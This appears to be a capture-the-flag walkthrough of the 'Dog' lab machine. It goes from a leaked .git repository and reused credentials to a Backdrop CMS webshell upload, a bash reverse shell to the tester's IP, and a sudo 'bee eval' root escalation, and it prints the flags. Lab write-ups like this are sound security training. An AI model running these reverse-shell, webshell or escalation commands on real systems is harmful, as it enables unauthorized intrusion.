# CTF Writeup: Dog

---

## Nmap Scan

nmap -A 10.129.231.223

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 05:25 CDT
Nmap scan report for 10.129.231.223
Host is up (0.034s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-title: Home | Dog
| http-git: 
|   10.129.231.223:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   16.05 ms 10.10.14.1
2   16.32 ms 10.129.231.223

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds
```

## Reconnaissance

##### The Nmap Scan provided information: 

- The git repository directory is exposed. Which is a critical misconfiguration.
- The Webpage is also running on Backdrop CMS 1.

Since a webpage is running, I will map the target_ip 10.129.231.223 to my /etc/hosts.

```
sudo echo "10.129.231.223 dog.htb" | sudo tee -a /etc/hosts
```
Inspecting the webpage shows us a /login page.

Decided to download the .git directory locally, utilizing a tool called git-dumpster

```
mkdir dump
virtualenv env
source env/bin/activate
pip3 install git-dumper
git-dumper http://dog.htb/ dump
```

Retrieved credentials in settings.php

```
root:BackDropJ2024DS2024
```

Unfortunately we can't login with those credentials, but it gives us the information that only the username isn't correct.

Utilizing the following URL http://dog.htb/?q=user/login within ffuf, doesn't give any proper results, so I researched on google with following prompt "backdrop scan github" and found user enumeration exploit path on following .py script.
```
https://github.com/FisMatHack/BackDropScan/blob/main/BackDropScan.py
```
Decided to enumerate user accounts utilizing ffuf with the parameter ?q=accounts instead of ?q=users.

```
ffuf -w /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -u http://dog.htb/?q=accounts/FUZZ          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dog.htb/?q=accounts/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

john                    [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 35ms]
tiffany                 [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 98ms]
John                    [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 68ms]
morris                  [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 101ms]
axel                    [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 1053ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Logged in succesfully with tiffany:BackDropJ2024DS2024.

tiffany is an Administrator account --> so we will be able to edit & upload files.

## Vulnerability Assessment

Enumerated Backdrop CMS Version 1.27.1 on http://dog.htb/?q=admin/appearance

Searched for CVE's and retrieved Authenticated Remote Code Execution for Version 1.27.1.

```
https://www.exploit-db.com/exploits/52021
```

## Initial Access

Downloaded exploit on local machine and executed following command:

```
sudo python3 52021.py http://dog.htb/
```

It creates a malicious .zip file, which should give us an command injection.

On http://dog.htb/?q=admin/installer/manual, we have the functionality to upload modules.

Unfortunately the crafted script, can't be uploaded. Since the site only accepts tar, tgz, gz or bz2.

```
The specified file shell.zip could not be uploaded. Only files with the following extensions are allowed: tar tgz gz bz2.
```

Converted our .zip into an tar.gz file, utilizing following command:

```
tar -czvf shell.tar.gz shell
```
Uploaded the script & received webshell on http://dog.htb/modules/shell/shell.php

Utilizing Netcat I started a listener on my local machine on port 1234.

```
nc -lvnp 1234
listening on [any] 1234 ...
```

Executed bash reverse shell script on input field

```
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"
```

Gained RCE as user www-data.

## Privilege Escalation

There are 3 users existing on the server.

```
cat /etc/passwd | grep "/bin/bash"

root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```
Logged into user johncusack:BackDropJ2024DS2024

```
su johncusack
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Retrieved user.txt flag in /home/johncusack

```
089f5ad5ddee76dec4d40b01143d4b83
```

made sudo -l to check which commands can be ran with higher priveleges without asking for authentification.

--> /usr/local/bin/bee binary can be run. Which executes bee.php --> A CLI Tool for Backdrop CMS.

There is a functionality inside it, called eval. Which allows us to execute arbitrary code.

Since the bee.php script has root rights, we can utilize the following command to receive root rights.

```
sudo /usr/local/bin/bee eval "system('/bin/bash');"
```
"system('/bin/bash');" is php syntax and spawns a bash shell.

It is important to note that the bee.php cli tool is only able to run those commands, if you are in the root directory of
the backdrop cms. It is where the settings.php is installed. In our case this would be /var/www/html/.

Gained Root Shell & retrieved root.txt flag.

```
root@dog:~# cat root.txt
cat root.txt
3b8a901aaa9851e6ccd1317820ce546a
```
